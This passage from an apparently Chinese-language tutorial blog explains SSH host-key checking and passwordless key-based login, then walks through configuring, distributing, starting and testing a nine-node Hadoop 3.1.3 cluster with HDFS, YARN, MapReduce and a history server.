<p>这段话的意思是，无法确认host主机的真实性，公钥指纹和MD5可能会被中间人攻击替换，问你还想继续吗？</p>
<p>所谓的“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将他变成128位的指纹。上列中是93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.再进行比较，就容易多了。</p>
<p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>系统会出现一句提示，表示host主机已经得到认可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>然后，会要求输入密码。</p>
<p>如果密码正确，就可以登录了。</p>
<p>当远程主机的公钥被接受以后，它就会被保存在用户home目录的$HOME&#x2F;.ssh&#x2F;known_hosts文件之中。下次再连接这台远程主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>如果远程主机重新装过系统或因为别的原因，导致ssh指纹改变，需要把.ssh目录下的know_hosts文件中相应远程主机IP一致的指纹删除，再通过ssh登录一次回答yes，重新认证一次方可登录。注意.ssh是目录是以“.”开头的隐藏目录，需要#ls -a参数才能看到。而且这个目录的权限必须是700，并且用户的home目录也不能给其他用户写权限，否则ssh服务器会拒绝登录。如果发生不能登录的问题，可以查看服务器上的日志文件&#x2F;var&#x2F;log&#x2F;secure。</p>
<p><strong>2.公钥登陆（免密码登陆）</strong></p>
<p>A服务器想要无密码登陆B服务器的话，得把自己的公钥给B，B如果想让A无密码登陆就认可A的公钥，这样A的发送的指令不保密（因为公钥是公开的），但是B返回的结果只有A能解开</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115384.png" alt="image-20210628003617469"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>还需要在 hadoop103 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop104 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop105 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop106 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop107 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop108 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop109 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop110 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop102 上采用 root 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。（得在root的目录下进行操作）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 .ssh]$ ll</span><br><span class="line">总用量 16</span><br><span class="line">-rw-------. 1 huang huang 3573 7月   1 00:50 authorized_keys</span><br><span class="line">-rw-------. 1 huang huang 1679 7月   1 00:44 id_rsa</span><br><span class="line">-rw-r--r--. 1 huang huang  397 7月   1 00:44 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 huang huang 1670 7月   1 00:45 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: 记录ssh访问过计算机的公钥（public key）</li>
<li>id_rsa: 生成的私钥</li>
<li>id_rsa.pub: 生成的公钥</li>
<li>authorized_keys: 存放授权过的无密码登录服务器公钥，授权过的服务器可以无密码访问本服务器</li>
</ul>
<h3 id="集群配置"><a href="#集群配置" class="headerlink" title="集群配置"></a>集群配置</h3><h4 id="集群规划"><a href="#集群规划" class="headerlink" title="集群规划"></a>集群规划</h4><ul>
<li>NameNode和SecondaryNameNode 不要安装在同一台服务器上</li>
<li>ResourceManage很消耗内存，最好不要和NameNode，SecondaryNameNode配置在同一台机器上</li>
</ul>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h4 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h4><p>Hadoop 配置文件分两类:默认配置文件和自定义配置文件，只有用户想修改某一默认</p>
<p>配置值时，才需要修改自定义配置文件，更改相应属性值。</p>
<h5 id="默认配置文件"><a href="#默认配置文件" class="headerlink" title="默认配置文件"></a>默认配置文件</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115385.png" alt="image-20210628012641270"></p>
<h5 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h5><p><strong>core-site.xml</strong>、<strong>hdfs-site.xml</strong>、<strong>yarn-site.xml</strong>、<strong>mapred-site.xml</strong> 四个配置文件存放在 $HADOOP_HOME&#x2F;etc&#x2F;hadoop 这个路径上，用户可以根据项目需求重新进行修改配置。</p>
<h4 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h4><h5 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h5><p>配置core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 NameNode 的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 配置 HDFS 网页登录使用的静态用户为 huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFS配置文件"><a href="#HDFS配置文件" class="headerlink" title="HDFS配置文件"></a>HDFS配置文件</h5><p>配置hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn web端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web 端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARN配置文件"><a href="#YARN配置文件" class="headerlink" title="YARN配置文件"></a>YARN配置文件</h5><p>配置yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MR 走 shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 ResourceManager 的地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduce配置文件"><a href="#MapReduce配置文件" class="headerlink" title="MapReduce配置文件"></a>MapReduce配置文件</h5><p>配置mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="集群分发"><a href="#集群分发" class="headerlink" title="集群分发"></a>集群分发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="去其余服务器上查看分发情况（已hadoop103为例）"><a href="#去其余服务器上查看分发情况（已hadoop103为例）" class="headerlink" title="去其余服务器上查看分发情况（已hadoop103为例）"></a>去其余服务器上查看分发情况（已hadoop103为例）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br></pre></td></tr></table></figure>



<h3 id="群起集群"><a href="#群起集群" class="headerlink" title="群起集群"></a>群起集群</h3><h4 id="配置workers"><a href="#配置workers" class="headerlink" title="配置workers"></a>配置workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line">hadoop105</span><br><span class="line">hadoop106</span><br><span class="line">hadoop107</span><br><span class="line">hadoop108</span><br><span class="line">hadoop109</span><br><span class="line">hadoop110</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同步所有节点配置文件</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br></pre></td></tr></table></figure>

<h4 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h4><p>1.如果集群是第一次启动，需要在hadoop102节点格式化NameNode(注意:格式化 NameNode，会产生新的集群 id，导致 NameNode 和 DataNode 的集群 id 不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化 NameNode 的话，<strong>一定要先停 止 NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.启动HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.在配置了ResourceManage的节点（hadoop103）启动yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Thu Jul  1 01:56:53 2021 from hadoop110</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web 端查看 HDFS 的 NameNode</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>查看 HDFS 上存储的数据信息</p>
</li>
</ul>
<p>5.Web 端查看 YARN 的 ResourceManager</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>查看 YARN 上运行的 Job 信息</p>
</li>
</ul>
<h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><h5 id="上传文件到集群"><a href="#上传文件到集群" class="headerlink" title="上传文件到集群"></a>上传文件到集群</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">小文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd input/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/input/word.txt /input</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">大文件</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-07-01 17:24:44,908 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-07-01 17:25:44,619 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="上传文件后查看文件存放在什么位置"><a href="#上传文件后查看文件存放在什么位置" class="headerlink" title="上传文件后查看文件存放在什么位置"></a>上传文件后查看文件存放在什么位置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-982674778-192.168.58.31-1625131269672/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 191948</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7月   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7月   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7月   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7月   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7月   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7月   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827</span><br><span class="line">huang huang ming ming wang</span><br><span class="line">huangmingwang</span><br><span class="line">hadoop hadoop hadoop </span><br><span class="line">mapreduce</span><br><span class="line">mapreduce</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">wang</span><br><span class="line">wang wang hadoop</span><br><span class="line">hadoop hadoop hadoop </span><br></pre></td></tr></table></figure>

<h5 id="拼接文件"><a href="#拼接文件" class="headerlink" title="拼接文件"></a>拼接文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 382396</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7月   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7月   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7月   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7月   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7月   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7月   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4月   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 7月   1 17:30 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br></pre></td></tr></table></figure>

<h5 id="执行wordcount程序"><a href="#执行wordcount程序" class="headerlink" title="执行wordcount程序"></a>执行wordcount程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="配置历史服务器"><a href="#配置历史服务器" class="headerlink" title="配置历史服务器"></a>配置历史服务器</h3><p>1.配置 mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>在该文件中增加如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器 web 端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.分发配置</p>
